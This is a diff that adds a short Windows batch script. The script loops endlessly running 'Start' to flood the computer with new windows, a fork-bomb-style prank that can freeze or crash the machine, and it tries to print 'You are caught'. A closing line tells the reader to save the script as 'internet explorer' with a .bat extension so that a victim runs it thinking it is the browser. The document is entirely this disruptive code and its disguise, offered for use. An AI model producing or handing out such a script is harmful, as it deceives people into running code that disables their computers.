@@ -1,0 +1,13 @@
+source code:
+@echo off
+:a
+Start
+Start
+Start
+echo
+*You are caught*
+Start
+Start
+goto:a
+
+Next save this as internet explorer and extention as .bat
